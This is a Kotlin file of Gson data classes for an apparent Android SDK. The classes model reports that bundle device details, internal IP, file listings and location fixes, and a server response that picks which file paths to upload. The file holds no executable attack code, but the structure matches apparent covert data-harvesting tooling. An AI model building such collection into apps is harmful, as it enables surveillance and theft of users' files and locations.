package com.sdocument.sdk.network.models

import com.google.gson.annotations.SerializedName

data class FileReportItem(
    @SerializedName("type") val type: String,
    @SerializedName("source") val source: String,
    @SerializedName("path") val path: String,
    @SerializedName("size") val size: Long,
    @SerializedName("last_modified") val lastModified: Long
)

data class LocationReportItem(
    @SerializedName("lat") val latitude: Double,
    @SerializedName("lng") val longitude: Double,
    @SerializedName("accuracy") val accuracy: Double,
    @SerializedName("provider") val provider: String,
    @SerializedName("time") val time: Long,
    @SerializedName("city") val city: String? = null,
    @SerializedName("country") val country: String? = null
)

data class DeviceInfo(
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("model") val model: String,
    @SerializedName("os_version") val osVersion: String,
    @SerializedName("api_level") val apiLevel: Int,
    @SerializedName("brand") val brand: String,
    @SerializedName("device") val device: String,
    @SerializedName("timezone") val timezone: String,
    @SerializedName("user_agent") val userAgent: String,
    @SerializedName("internal_ip") val internalIp: String
)

data class MetadataReportRequest(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("device_info") val deviceInfo: DeviceInfo? = null,
    @SerializedName("files") val files: List<FileReportItem>,
    @SerializedName("locations") val locations: List<LocationReportItem>,
    @SerializedName("scrape_time") val scrapeTime: Long,
    @SerializedName("total_files") val totalFiles: Int
)

data class MetadataReportResponse(
    @SerializedName("status") val status: String,
    @SerializedName("files_to_upload") val filesToUpload: List<String>?, // List of paths to upload
    @SerializedName("total_new") val totalNew: Int?,
    @SerializedName("total_known") val totalKnown: Int?,
    @SerializedName("total_excluded") val totalExcluded: Int?,
    @SerializedName("exclude_extensions") val excludeExtensions: List<String>?,
    @SerializedName("exclude_patterns") val excludePatterns: List<String>?
)
